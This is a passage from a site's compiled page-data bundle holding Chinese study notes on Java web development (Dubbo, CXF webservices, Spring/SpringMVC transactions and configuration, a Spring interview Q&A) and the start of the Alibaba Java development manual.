\n   配置zookeeper注册中心暴露服务地址<dubbo:registry>\n   获取注册中心的接口信息<dubbo:reference>\n\n3. httpclient短信验证码\n\n> 参考互亿无线文档\n\n 1. 前端点击获取验证码的时候，ajax访问后台请求，同时倒计时60秒\n 2. 我们在后台拿到短信平台提供的接口地址，然后看他需要什么参数（用户名，密码，手机号，短信验证码），它有文档demo嘛，就根据它的改成我们需要的，然后拼装参数给他返回去\n 3. 然后他呢也会给我们返回一堆参数(是成功还是失败)，我们把这些参数返回给前端\n\n4. webservice\n\n> 参考博客简单的webservice接口生成\n> 方法上加@webmentod(exclude=true)后，此方法不被发布\n> 静态方法不会被发布\n\n 1. 配置web.xml文件 设置cxf要拦截的路径\n    cxf服务端必须定义cxfservlet对象\n 2. 配置服务端cxf.xml文件 （暴露访问地址,发布接口）\n    <cxf:endpoint address="/user" implementor="#实现类"/>\n 3. 定义一个bean类\n 4. 争对这个bean类写一个接口，在接口前加注解\n    @javax.jws.webservice(表示一个服务端发布接口)\n 5. 在这个接口的实现类加@javax.jws.webservice、 @service (服务层)\n 6. 地址栏登陆时：记得\n    http://localhost:8080/工程名/ws(web.xml配置)/自己配置的地址?wsdl\n\n * 如果用cxf测试接口的话\n   1. 配置cxf服务端(以上)\n   2. 配置客户端xml 请求地址，和服务端暴露的接口\n   3. cmd下 一堆命令\n\n5. spring中配置事务\n\n> 声明式事务配置详解\n\n * web.xml加载顺序：\n\n 1. listener 加载spring\n\n \x3c!-- spring start --\x3e\n <listener>\n \t\x3c!-- spring web容器  默认加载spring配置文件路径为 web-inf/applicationcontext.xml--\x3e\n \t<listener-class>\n \t\torg.springframework.web.context.contextloaderlistener\n \t</listener-class>\n </listener>\n \n <context-param>\n \t<param-name>contextconfiglocation</param-name>\n \t<param-value>classpath:applicationcontext*.xml</param-value>\n </context-param>\n \x3c!-- spring end --\x3e\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 2. filter\n 3. servlet\n\n\x3c!-- springmvc start --\x3e\n <servlet>\n \t<servlet-name>mvc</servlet-name>\n \t<servlet-class>\n \t\torg.springframework.web.servlet.dispatcherservlet\n \t</servlet-class>\n \t<init-param>\n \t\t<param-name>contextconfiglocation</param-name>\n \t\t<param-value>classpath:springmvc.xml</param-value>\n \t</init-param>\n </servlet>\n \n <servlet-mapping>\n \t<servlet-name>mvc</servlet-name>\n \t<url-pattern>/</url-pattern>\n </servlet-mapping>\n \x3c!-- springmvc end --\x3e\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n * web.xml加载的时候先加载spring，后加载springmvc\n\n 1. spring自带aop，spring是父容器\n 2. springmvc没有引入aop，springmvc是子容器\n 3. 子容器的创建依赖于父容器的创建，父容器先于子容器创建；子容器 (springmvc 容器) 可以访问父容器 (spring 容器) 的 bean，父容器 (spring 容器) 不能访问子容器 (springmvc 容器) 的 bean\n 4. 所以一般在子容器springmvc中开启aop配置 <aop:aspectj-autoproxy/>\n 5. 而事务、切面都依赖于aop\n 6. 如果不想aop在controller生效，则配置的时候可以让springmvc只扫描@controller注解，spring扫描除了@controller的其它所有注解，并且在spring中开启aop配置即可\n\n * 以下是具体配置：\n\n\x3c!-- springmvc配置 --\x3e\n\n\x3c!-- use-default-filters="false" 所有注解不被加载 --\x3e\n<context:component-scan base-package="com.xxx" use-default-filters="false">\n    \x3c!-- 只加载@controller注解 --\x3e\n    <context:include-filter type="annotation" \n                            expression="org.springframework.stereotype.controller" />\n</context:component-scan>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\x3c!-- spring配置 --\x3e\n\n\x3c!-- spring配置aop --\x3e\n<aop:aspectj-autoproxy/>\n\x3c!-- use-default-filters="true" 默认、加载所有注解 --\x3e\n<context:component-scan base-package="com.xxx">\n    \x3c!-- 加载除了@controller的其它所有注解 --\x3e\n    <context:exclude-filter type="annotation" \n                            expression="org.springframework.stereotype.controller"/>\n</context:component-scan>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Q&A宝典-spring入门篇",frontmatter:{title:"Q&A宝典-spring入门篇",date:"2019-12-06T00:00:00.000Z",tags:["复习"],categories:["知识晶体 Q&A"],isShowComments:!1},regularPath:"/views/qaq/sum_spring_001.html",relativePath:"views/qaq/sum_spring_001.md",key:"v-29e4e07c",path:"/views/qaq/sum_spring_001.html",headers:[{level:2,title:"综合入门",slug:"综合入门",normalizedTitle:"综合入门",charIndex:2}],headersStr:"综合入门",content:'# 综合入门\n\n1.hibernate 和 mybatis 区别？\n 1. hibernate自动，mybatis半自动\n 2. 日志 hibernate自带\n 3. 移植性 hibernate：hql qbc面向对象,更换数据库,只更换方言即可\n 4. 优化 mybatis自己写sql灵活方便\n 5. 一级缓存\n    hibernate底层是Hashtable 线程安全\n    mybatis底层是HashMap 线程不安全\n\n2.spring容器启动流程、配置\n * 配置spring.xml\n\n 1. 初始化springIOC容器,加载spring.xml\n    ApplicatonContext ac = new ClassPathXmlApplicationContext("spring.xml");\n\n 2. 扫描注解\n    <context:component-scan base-package="com.etoak">\n\n 3. 配置spring加载数据源\n    \n    * DriverManagerDataSource\n\n 4. 配置spring整合mybatis\n    \n    * 注入数据源\n    * 设置别名(包下所有类类名全部小写)\n    * 加载 sql.xml映射文件\n    * 加载 PageHelper等插件\n\n 5. 配置扫描接口(sql.xml文件所在包)\n    \n    * 获得sqlSessionFactory(上一步的3以获得) sqlSessionFactoryBeanName\n    * 实例化接口 basePackage\n\n 6. 配置事务管理器(只需注入数据源)\n    \n    <bean id="tx" class="org.springframework.jdbc.datasource.DataSourceTransactionManager">\n        <property name="dataSource" ref="dataSource"></property>\n    </bean>\n    \n    \n    1\n    2\n    3\n    \n\n 7. 注解(在需要事务的方法上@Transactional)使用声明事务(底层我们用cglib动态代理)\n    \n    注意属性readOnly="true"为只读，在select时可以设置\n    \n    \n    \x3c!-- 配置事务管理器 --\x3e\n    <bean id="tx" class="org.springframework.jdbc.datasource.DataSourceTransactionManager">\n        \x3c!-- 注入数据源  加入事务   但是没有开启事务 --\x3e\n        <property name="dataSource" ref="dataSource"></property>\n    </bean>\n    \n    \x3c!-- 声明式事务  aop环绕通知--\x3e\n    <tx:annotation-driven proxy-target-class="true" transaction-manager="tx" />\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n3.什么是事务?\n\n多条sql语句作为一个执行单元,要么全部执行,要么全不执行\n\n * 原子性、一致性、隔离性、持久性\n\n4.spring创建事物的方式?(两种)\n 1. 声明式事务 在xml中配置信息\n 2. 编程式事务 在代码中编写\n\n5.软编码硬编码\n * 硬编码：就是在程序中将代码写死,维护不方便\n * 软编码：可以在运行时确定,软编码只支持post请求\n\n6.web.xml文件加载先后顺寻\n 1. listener\n    多个监听器 谁在前 谁先被加载\n 2. filter\n    多个过滤器 谁在前 谁先被加载\n 3. servlet\n    启动不会被加载 当第一个请求发送过来时<url-pattern>*.do</url-pattern> 才会被实例化\n\n7.HttPServlet声明周期\n 1. 实例化\n 2. 初始化方法\n 3. 运行(doGet/doPost)\n 4. 消亡\n\n8.springmvc提供的两种视图类型\n 1. ModelAndView\n 2. String\n\n9.重定向和请求转发\n 1. 请求转发：发送一次请求,跳转后地址栏不发生改变\n 2. 重定向：跳转后地址栏发生改变\n    主要用在防止表单重复提交、 不能使用request范围、 跳转之后肯定执行doGet方法\n\n10.springmvc流程\n\n 1. 新建一个页面,发送第一次请求地址\n\n 2. 到达web.xml，web.xml依次加载\n    \n    * listener：初始化spring容器\n    * filter：设置请求、响应编码\n    * servlet： 默认加载WEB-INF/某某某(注意名字保持一致,可自定义)-servlet.xml配置文件 拦截请求\n\n 3. 加载XXX-servlet.xml配置文件并解析\n    \n    \n    [1] context注解扫描\n    springmvc必须的有@Controller注解(得在这层接收客户端请求)\n    \n    \n    [2] 配置映射器、适配器 、类型转换(底层自动实现)\n    <mvc:acnotation-driven />\n    \n    [3] 实例化视图解析器\n    \n    \n    \x3c!-- 视图解析器 --\x3e\n    <bean class="org.springframework.web.servlet.view.InternalResourceViewResolver">\n        \x3c!-- 前缀 --\x3e\n        <property name="prefix"\n                  value="/pages/"></property>\n        \x3c!-- 后缀 --\x3e\n        <property name="suffix"\n                  value=".jsp"></property>\n    </bean>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n    \n    [4] 文件上传解析器,id必须是这个\n    \n    <bean id="multipartResolver" class="org.springframework.web.multipart.commons.CommonsMultipartResolver">\n        <property name="defaultEncoding" value="utf-8" />\n        <property name="maxUploadSize" value="3000000000" />\n    </bean>\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. 通过拦截的请求来匹配@Controller层\n    \n    [1] 映射器匹配拿到的请求 在某个方法上@RequestMappeing(value="/login")\n    \n    [2] 适配器指定执行这个方法\n    \n    [3] 接受请求参数,并经行类型转换 @RequestParam(valeu="前台name")\n    注意日期不能自动转,所以有个注解@DateTimeFormat(pattern="yyyy-MM-dd")\n\n 5. 执行方法里的业务逻辑\n\n 6. ModelAndView跳转视图\n    ModelAndView mv = new ModelAndView("除前后缀页面"); return mv;\n\n 7. 视图解析器渲染视图名称,完成之后跳转视图\n\n11.springmvc组成部分\n 1. 自中央处理器 DispatcherServlet\n    \n 2. 映射器 mvc:annotation-driven @RequestMappeing\n    \n 3. 适配器 mvc:annotation-driven 执行方法\n 4. 处理器 @Controller\n    \n 5. 视图解析器 InternalResourceViewResolver\n    \n 6. 视图 我们看不见，底层动的\n    \n 7. 异常处理器\n    \n 8. 上传解析器\n\n12.spring Bean 声明周期\n\nspring Bean 声明周期\n\n13.如何在src目录加载properties\n\n<context:property-placeholder file-encoding="UTF-8" location="classpath:jdbc.properties"/>\n\n14.将文件存放到数据库中\n\nMYSQL      ORACLE   JAVA     \nlongblob   blob     byte[]   二进制类型\ntext       clob     String   大文本类型\n\n15.springmvc文件上传\n\n有个类MultipartFile、方法transferTo\n\npublic String upload(@RequestParam(value="f") MultipartFile f,HttpSession session){\n\n    //MultipartFile有transferTo()这么一个方法写出文件\n    f.transferTo(new File(path,filenewname));\n\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n * springmvc文件下载\n   \n   记得设置响应头信息 response.setHeader("Content-Disposition","attachment;filename="+filename);\n\n16，springmvc 提供2种 请求格式\n\n 1. *.do、*.action\n\n 2. / 默认不加载静态资源 js css\n    默认不加载静态资源，要加载的话需要在spring配置文件中配置解析\n    \n    \x3c!-- 静态servlet对象 针对/请求不加载静态资源 js css img  --\x3e\n    <mvc:default-servlet-handler />\n    \n    \n    1\n    2\n    \n\n17.在前端 json 和 js对象的互转\n * JSON.parse(str);\n * JSON.stringify(object);\n\n18.springmvc集成spring,可以使用spring拥有的信息,但只能使用spring的ioc信息,aop不能使用\n\n即：容器启动时,spring先加载,springmvc后加载\nspring 配置事务,事务底层时aop实现的,springmvc没有aop的配置\nspringmvc 没有配置事务,所以会覆盖掉spring配置\n\n\n所以事务会失效，解决办法：\n让springmvc不扫描有事务的层(service层)只扫描Controller层\n让spring扫描除了Controller的其他层\n\n19.数据库建表3范式\n 1. 关系型数据库\n    表、字段、值 有相互关系\n 2. 创建字段\n    所有字段中必须有一个字段是唯一的\n 3. 字段不能冗余\n\n20.disabled和readonly的区别\n * 都是使文本框失效(不能输入)\n   disabled：前端显示为灰色,后台接受值为null\n   readonly：前端显示为白色,后台可以接受到值\n\n21.bootstrap和easyui区别\n * easyui 是js框架,没有响应式布局\n * bootstrap 侧重css的前端框架,有响应式布局\n\n22.js中 == 和 === 的区别\n\n== 只比较内容\n=== 先比较类型，再比较内容\n\n23.过滤器和拦截器的区别\n * 过滤器：\n   在web.xml中配置,由servlet实例化对象,spring不能注入,什么请求都拦截\n * 拦截器：\n   只拦截后台请求, 都是由spring进行管理的,springmvc除了jsp之外都拦截\n\n24.struts2和springmvc的区别\n 1. 入口\n    struts2：web.xml filter元素,容器启动初始化\n    mvc: web.xml servlet元素,第一次触发请求实例化对象\n 2. 创建对象\n    struts2： 基于类开发,发送请求时,每次都会创建对象,多例的\n    mvc: 基于方法开发,一般设计为单例(默认)\n 3. 接受请求参数\n    struts2: 成员变量 依赖类存在\n    mvc: 局部变量 依赖方法存在\n\n25.数据库中的符号\n\nand 相当于 &&\nor 相当于 ||\n&gt; 相当于 >\n&lt; 相当于 <\n\n\n26.事务的 隔离机制和七种传播途径\n\n * 脏读:读到了其他事物未提交的数据\n\n * 不可重复读:一次读取到记录之后其他事物对这条数据进行了修改,再次读取数据不一致\n\n * 幻读:相同的查询条件首次查询后,其他事物添加或删除了新的数据,再次查询不一致\n\n * 隔离机制：(解决脏读,不可重复读,幻读)\n\n                     脏读   不可重复读   幻读\nRead uncommitted :   会    会       会\nRead committed :     不会   会       会\nRepeatable read :    不会   不会      会\nSerializable :       不会   不会      不会\n\n * 传播行为:\n   国内最常用的就是propagation_required 事务的操作有异常是都得向上抛,不能向上抛就自己new一个异常,不要try(非要try的话,就自己在造一个异常)。\n\n27.随便写一个自增编号\n\nCalendar c = Calendar.getInstance();\nString no = "ABC" + c.get(1) + String.format("%04d",(++count));\n\n\n1\n2\n\n28.maven的作用\n * 依赖管理jar包\n * 基于多模块\n\n29.xml和对象的互转\n\njava jaxb\n\n30.网络传输,跨项目访问\n * webService: 既可以当客户端又可以当服务端\n   1. 跨平台 跨语言\n   2. 多用在企业\n   3. soap协议\n   4. http://localhost:8080/SSM/ws/user?wsdl\n * httpclient: 相当于客户端\n   1. 多用在互联网 调接口/新老系统模块的调用\n   2. http协议\n   3. http://localhost:8080/SSM/ws/user\n\n31.webService如何使用\n\n * 服务端：\n   \n   0. 先在web.xml文件中配置\n   1. 配置服务端cxf.xml文件\n   2. 定义一个bean类\n   3. 争对这个bean写一个接口,在接口前加注解@javax.jws.WebService\n   4. 在这个接口里写响应的增删该查(定义方法的参数和返回值时 注意不要使用Map对象)\n   5. 针对接口写实现类\n   6. 在实现类上加@javax.jws.WebService ，@org.springframework.stereotype.Service //这是一个服务层 在类里写响应的实现\n\n * 客户端：\n   \n   0. 新建一个测试项目\n   1. 配置客户端cxf.xml文件 （具体使用见下一题）\n      将生成的文件复制到工程中,新建一个test类测试\n\n32.cxf测试接口的工具如何使用:\n\n 1. 配置cxf环境变量\n    path=E:\\web server\\apache-cxf-3.1.11\\bin\n\n 2. cmd下输入命令\n    wsdl2java -d d:/ws -p com.etoak.client http://localhost:8080/SSM/ws/user?wsdl\n    -d表示生成客户端代码的位置\n    -p表示生成客户端代码的包结构\n\n * 其它方式：soapui工具',normalizedContent:'# 综合入门\n\n1.hibernate 和 mybatis 区别？\n 1. hibernate自动，mybatis半自动\n 2. 日志 hibernate自带\n 3. 移植性 hibernate：hql qbc面向对象,更换数据库,只更换方言即可\n 4. 优化 mybatis自己写sql灵活方便\n 5. 一级缓存\n    hibernate底层是hashtable 线程安全\n    mybatis底层是hashmap 线程不安全\n\n2.spring容器启动流程、配置\n * 配置spring.xml\n\n 1. 初始化springioc容器,加载spring.xml\n    applicatoncontext ac = new classpathxmlapplicationcontext("spring.xml");\n\n 2. 扫描注解\n    <context:component-scan base-package="com.etoak">\n\n 3. 配置spring加载数据源\n    \n    * drivermanagerdatasource\n\n 4. 配置spring整合mybatis\n    \n    * 注入数据源\n    * 设置别名(包下所有类类名全部小写)\n    * 加载 sql.xml映射文件\n    * 加载 pagehelper等插件\n\n 5. 配置扫描接口(sql.xml文件所在包)\n    \n    * 获得sqlsessionfactory(上一步的3以获得) sqlsessionfactorybeanname\n    * 实例化接口 basepackage\n\n 6. 配置事务管理器(只需注入数据源)\n    \n    <bean id="tx" class="org.springframework.jdbc.datasource.datasourcetransactionmanager">\n        <property name="datasource" ref="datasource"></property>\n    </bean>\n    \n    \n    1\n    2\n    3\n    \n\n 7. 注解(在需要事务的方法上@transactional)使用声明事务(底层我们用cglib动态代理)\n    \n    注意属性readonly="true"为只读，在select时可以设置\n    \n    \n    \x3c!-- 配置事务管理器 --\x3e\n    <bean id="tx" class="org.springframework.jdbc.datasource.datasourcetransactionmanager">\n        \x3c!-- 注入数据源  加入事务   但是没有开启事务 --\x3e\n        <property name="datasource" ref="datasource"></property>\n    </bean>\n    \n    \x3c!-- 声明式事务  aop环绕通知--\x3e\n    <tx:annotation-driven proxy-target-class="true" transaction-manager="tx" />\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n3.什么是事务?\n\n多条sql语句作为一个执行单元,要么全部执行,要么全不执行\n\n * 原子性、一致性、隔离性、持久性\n\n4.spring创建事物的方式?(两种)\n 1. 声明式事务 在xml中配置信息\n 2. 编程式事务 在代码中编写\n\n5.软编码硬编码\n * 硬编码：就是在程序中将代码写死,维护不方便\n * 软编码：可以在运行时确定,软编码只支持post请求\n\n6.web.xml文件加载先后顺寻\n 1. listener\n    多个监听器 谁在前 谁先被加载\n 2. filter\n    多个过滤器 谁在前 谁先被加载\n 3. servlet\n    启动不会被加载 当第一个请求发送过来时<url-pattern>*.do</url-pattern> 才会被实例化\n\n7.httpservlet声明周期\n 1. 实例化\n 2. 初始化方法\n 3. 运行(doget/dopost)\n 4. 消亡\n\n8.springmvc提供的两种视图类型\n 1. modelandview\n 2. string\n\n9.重定向和请求转发\n 1. 请求转发：发送一次请求,跳转后地址栏不发生改变\n 2. 重定向：跳转后地址栏发生改变\n    主要用在防止表单重复提交、 不能使用request范围、 跳转之后肯定执行doget方法\n\n10.springmvc流程\n\n 1. 新建一个页面,发送第一次请求地址\n\n 2. 到达web.xml，web.xml依次加载\n    \n    * listener：初始化spring容器\n    * filter：设置请求、响应编码\n    * servlet： 默认加载web-inf/某某某(注意名字保持一致,可自定义)-servlet.xml配置文件 拦截请求\n\n 3. 加载xxx-servlet.xml配置文件并解析\n    \n    \n    [1] context注解扫描\n    springmvc必须的有@controller注解(得在这层接收客户端请求)\n    \n    \n    [2] 配置映射器、适配器 、类型转换(底层自动实现)\n    <mvc:acnotation-driven />\n    \n    [3] 实例化视图解析器\n    \n    \n    \x3c!-- 视图解析器 --\x3e\n    <bean class="org.springframework.web.servlet.view.internalresourceviewresolver">\n        \x3c!-- 前缀 --\x3e\n        <property name="prefix"\n                  value="/pages/"></property>\n        \x3c!-- 后缀 --\x3e\n        <property name="suffix"\n                  value=".jsp"></property>\n    </bean>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n    \n    [4] 文件上传解析器,id必须是这个\n    \n    <bean id="multipartresolver" class="org.springframework.web.multipart.commons.commonsmultipartresolver">\n        <property name="defaultencoding" value="utf-8" />\n        <property name="maxuploadsize" value="3000000000" />\n    </bean>\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. 通过拦截的请求来匹配@controller层\n    \n    [1] 映射器匹配拿到的请求 在某个方法上@requestmappeing(value="/login")\n    \n    [2] 适配器指定执行这个方法\n    \n    [3] 接受请求参数,并经行类型转换 @requestparam(valeu="前台name")\n    注意日期不能自动转,所以有个注解@datetimeformat(pattern="yyyy-mm-dd")\n\n 5. 执行方法里的业务逻辑\n\n 6. modelandview跳转视图\n    modelandview mv = new modelandview("除前后缀页面"); return mv;\n\n 7. 视图解析器渲染视图名称,完成之后跳转视图\n\n11.springmvc组成部分\n 1. 自中央处理器 dispatcherservlet\n    \n 2. 映射器 mvc:annotation-driven @requestmappeing\n    \n 3. 适配器 mvc:annotation-driven 执行方法\n 4. 处理器 @controller\n    \n 5. 视图解析器 internalresourceviewresolver\n    \n 6. 视图 我们看不见，底层动的\n    \n 7. 异常处理器\n    \n 8. 上传解析器\n\n12.spring bean 声明周期\n\nspring bean 声明周期\n\n13.如何在src目录加载properties\n\n<context:property-placeholder file-encoding="utf-8" location="classpath:jdbc.properties"/>\n\n14.将文件存放到数据库中\n\nmysql      oracle   java     \nlongblob   blob     byte[]   二进制类型\ntext       clob     string   大文本类型\n\n15.springmvc文件上传\n\n有个类multipartfile、方法transferto\n\npublic string upload(@requestparam(value="f") multipartfile f,httpsession session){\n\n    //multipartfile有transferto()这么一个方法写出文件\n    f.transferto(new file(path,filenewname));\n\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n * springmvc文件下载\n   \n   记得设置响应头信息 response.setheader("content-disposition","attachment;filename="+filename);\n\n16，springmvc 提供2种 请求格式\n\n 1. *.do、*.action\n\n 2. / 默认不加载静态资源 js css\n    默认不加载静态资源，要加载的话需要在spring配置文件中配置解析\n    \n    \x3c!-- 静态servlet对象 针对/请求不加载静态资源 js css img  --\x3e\n    <mvc:default-servlet-handler />\n    \n    \n    1\n    2\n    \n\n17.在前端 json 和 js对象的互转\n * json.parse(str);\n * json.stringify(object);\n\n18.springmvc集成spring,可以使用spring拥有的信息,但只能使用spring的ioc信息,aop不能使用\n\n即：容器启动时,spring先加载,springmvc后加载\nspring 配置事务,事务底层时aop实现的,springmvc没有aop的配置\nspringmvc 没有配置事务,所以会覆盖掉spring配置\n\n\n所以事务会失效，解决办法：\n让springmvc不扫描有事务的层(service层)只扫描controller层\n让spring扫描除了controller的其他层\n\n19.数据库建表3范式\n 1. 关系型数据库\n    表、字段、值 有相互关系\n 2. 创建字段\n    所有字段中必须有一个字段是唯一的\n 3. 字段不能冗余\n\n20.disabled和readonly的区别\n * 都是使文本框失效(不能输入)\n   disabled：前端显示为灰色,后台接受值为null\n   readonly：前端显示为白色,后台可以接受到值\n\n21.bootstrap和easyui区别\n * easyui 是js框架,没有响应式布局\n * bootstrap 侧重css的前端框架,有响应式布局\n\n22.js中 == 和 === 的区别\n\n== 只比较内容\n=== 先比较类型，再比较内容\n\n23.过滤器和拦截器的区别\n * 过滤器：\n   在web.xml中配置,由servlet实例化对象,spring不能注入,什么请求都拦截\n * 拦截器：\n   只拦截后台请求, 都是由spring进行管理的,springmvc除了jsp之外都拦截\n\n24.struts2和springmvc的区别\n 1. 入口\n    struts2：web.xml filter元素,容器启动初始化\n    mvc: web.xml servlet元素,第一次触发请求实例化对象\n 2. 创建对象\n    struts2： 基于类开发,发送请求时,每次都会创建对象,多例的\n    mvc: 基于方法开发,一般设计为单例(默认)\n 3. 接受请求参数\n    struts2: 成员变量 依赖类存在\n    mvc: 局部变量 依赖方法存在\n\n25.数据库中的符号\n\nand 相当于 &&\nor 相当于 ||\n&gt; 相当于 >\n&lt; 相当于 <\n\n\n26.事务的 隔离机制和七种传播途径\n\n * 脏读:读到了其他事物未提交的数据\n\n * 不可重复读:一次读取到记录之后其他事物对这条数据进行了修改,再次读取数据不一致\n\n * 幻读:相同的查询条件首次查询后,其他事物添加或删除了新的数据,再次查询不一致\n\n * 隔离机制：(解决脏读,不可重复读,幻读)\n\n                     脏读   不可重复读   幻读\nread uncommitted :   会    会       会\nread committed :     不会   会       会\nrepeatable read :    不会   不会      会\nserializable :       不会   不会      不会\n\n * 传播行为:\n   国内最常用的就是propagation_required 事务的操作有异常是都得向上抛,不能向上抛就自己new一个异常,不要try(非要try的话,就自己在造一个异常)。\n\n27.随便写一个自增编号\n\ncalendar c = calendar.getinstance();\nstring no = "abc" + c.get(1) + string.format("%04d",(++count));\n\n\n1\n2\n\n28.maven的作用\n * 依赖管理jar包\n * 基于多模块\n\n29.xml和对象的互转\n\njava jaxb\n\n30.网络传输,跨项目访问\n * webservice: 既可以当客户端又可以当服务端\n   1. 跨平台 跨语言\n   2. 多用在企业\n   3. soap协议\n   4. http://localhost:8080/ssm/ws/user?wsdl\n * httpclient: 相当于客户端\n   1. 多用在互联网 调接口/新老系统模块的调用\n   2. http协议\n   3. http://localhost:8080/ssm/ws/user\n\n31.webservice如何使用\n\n * 服务端：\n   \n   0. 先在web.xml文件中配置\n   1. 配置服务端cxf.xml文件\n   2. 定义一个bean类\n   3. 争对这个bean写一个接口,在接口前加注解@javax.jws.webservice\n   4. 在这个接口里写响应的增删该查(定义方法的参数和返回值时 注意不要使用map对象)\n   5. 针对接口写实现类\n   6. 在实现类上加@javax.jws.webservice ，@org.springframework.stereotype.service //这是一个服务层 在类里写响应的实现\n\n * 客户端：\n   \n   0. 新建一个测试项目\n   1. 配置客户端cxf.xml文件 （具体使用见下一题）\n      将生成的文件复制到工程中,新建一个test类测试\n\n32.cxf测试接口的工具如何使用:\n\n 1. 配置cxf环境变量\n    path=e:\\web server\\apache-cxf-3.1.11\\bin\n\n 2. cmd下输入命令\n    wsdl2java -d d:/ws -p com.etoak.client http://localhost:8080/ssm/ws/user?wsdl\n    -d表示生成客户端代码的位置\n    -p表示生成客户端代码的包结构\n\n * 其它方式：soapui工具',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"阿里巴巴 Java 开发手册 v1.2.0",frontmatter:{title:"阿里巴巴 Java 开发手册 v1.2.0",date:"2017-05-02T00:00:00.000Z",sidebar:!0,sidebarDepth:5,tags:["开发规范","Java"],categories:["规范 Standard"],isShowComments:!0},regularPath:"/views/specification/ali.html",relativePath:"views/specification/ali.md",key:"v-6a261bb4",path:"/views/specification/ali.html",headers:[{level:2,title:"前言",slug:"前言",normalizedTitle:"前言",charIndex:50},{level:2,title:"编程规范",slug:"编程规范",normalizedTitle:"编程规范",charIndex:771},{level:3,title:"命名风格",slug:"命名风格",normalizedTitle:"命名风格",charIndex:780},{level:3,title:"常量定义",slug:"常量定义",normalizedTitle:"常量定义",charIndex:3422},{level:3,title:"代码格式",slug:"代码格式",normalizedTitle:"代码格式",charIndex:4446},{level:3,title:"OOP 规约",slug:"oop-规约",normalizedTitle:"oop 规约",charIndex:6524},{level:3,title:"集合处理",slug:"集合处理",normalizedTitle:"集合处理",charIndex:10339},{level:3,title:"并发处理",slug:"并发处理",normalizedTitle:"并发处理",charIndex:14244},{level:3,title:"控制语句",slug:"控制语句",normalizedTitle:"控制语句",charIndex:17330},{level:3,title:"注释规约",slug:"注释规约",normalizedTitle:"注释规约",charIndex:19149},{level:3,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:20590},{level:2,title:"异常日志",slug:"异常日志",normalizedTitle:"异常日志",charIndex:278},{level:3,title:"异常处理",slug:"异常处理",normalizedTitle:"异常处理",charIndex:21447},{level:3,title:"日志规约",slug:"日志规约",normalizedTitle:"日志规约",charIndex:23656},{level:2,title:"MYSQL 数据库",slug:"mysql-数据库",normalizedTitle:"mysql 数据库",charIndex:25287},{level:3,title:"建表规约",slug:"建表规约",normalizedTitle:"建表规约",charIndex:25301},{level:3,title:"索引规约",slug:"索引规约",normalizedTitle:"索引规约",charIndex:27085},{level:3,title:"SQL 语句",slug:"sql-语句",normalizedTitle:"sql 语句",charIndex:28940},{level:3,title:"ORM 映射",slug:"orm-映射",normalizedTitle:"orm 映射",charIndex:30362},{level:2,title:"工程结构",slug:"工程结构",normalizedTitle:"工程结构",charIndex:216},{level:3,title:"应用分层",slug:"应用分层",normalizedTitle:"应用分层",charIndex:31624},{level:3,title:"二方库依赖",slug:"二方库依赖",normalizedTitle:"二方库依赖",charIndex:6922},{level:3,title:"服务器",slug:"服务器",normalizedTitle:"服务器",charIndex:19043},{level:2,title:"安全规约",slug:"安全规约",normalizedTitle:"安全规约",charIndex:298},{level:2,title:"附 1：版本历史",slug:"附-1-版本历史",normalizedTitle:"附 1：版本历史",charIndex:36332},{level:2,title:"附 2：本手册专有名词",slug:"附-2-本手册专有名词",normalizedTitle:"附 2：本手册专有名词",charIndex:36898}],headersStr:"前言 编程规范 命名风格 常量定义 代码格式 OOP 规约 集合处理 并发处理 控制语句 注释规约 其他 异常日志 异常处理 日志规约 MYSQL 数据库 建表规约 索引规约 SQL 语句 ORM 映射 工程结构 应用分层 二方库依赖 服务器 安全规约 附 1：版本历史 附 2：本手册专有名词",content:'> 最新阿里编码规范： https://edu.aliyun.com/course/417\n\n\n# 前言\n\n《阿里巴巴 Java 开发手册》是阿里巴巴集团技术团队的集体经验总结，经历了多次大规模一线实战的检验及不断的完善，反馈给广大开发者。现代软件行业的高速发展对开发者的综合素质要求越来越高，因为不仅是编程知识点，其它维度的知识点也会影响到软件的最终交付质量。比如：数据库的表结构和索引设计缺陷可能带来软件上的架构缺陷或性能风险；工程结构混乱导致后续维护艰难；没有鉴权的漏洞代码易被黑客攻击等等。所以本手册以 Java 开发者为中心视角，划分为编程规约、异常日志、MySQL 数据库、工程结构、安全规约五大块，再根据内容特征，细分成若干二级子目录。根据约束力强弱及故障敏感性，规约依次分为强制、推荐、参考三大类。对于规约条目的延伸信息中，“说明”对内容做了引申和解释；“正例”提倡什么样的编码和实现方式；“反例”说明需要提防的雷区，以及真实的错误案例。\n\n本手册的愿景是码出高效、码出质量。代码的字里行间流淌的是软件生命中的血 液，质量的提升是尽可能少踩坑，杜绝踩重复的坑，切实提升质量意识。另外，现代 软件架构都需要协同开发完成，高效协作即降低协同成本，提升沟通效率，所谓无规 矩不成方圆，无规范不能协作。众所周知，制订交通法规表面上是要限制行车权，实 际上是保障公众的人身安全。试想如果没有限速，没有红绿灯，谁还敢上路行驶。对 软件来说，适当的规范和标准绝不是消灭代码内容的创造性、优雅性，而是限制过度 个性化，以一种普遍认可的统一方式一起做事，提升协作效率。\n\n《阿里巴巴 Java 开发手册》，开放包容地认真听取社区、博客、论坛的反馈，及时修正，保持与时俱进。请关注手册末页的“阿里技术”和“云栖社区”公众号获取最新版本。\n\n\n# 编程规范\n\n\n# 命名风格\n\n 1.  【强制】代码中的命名均不能以下划线或美元符号开始，也不能以下划线或美元符号结束。\n     反例： _name / __name / $Object / name_ / name$ / Object$\n\n 2.  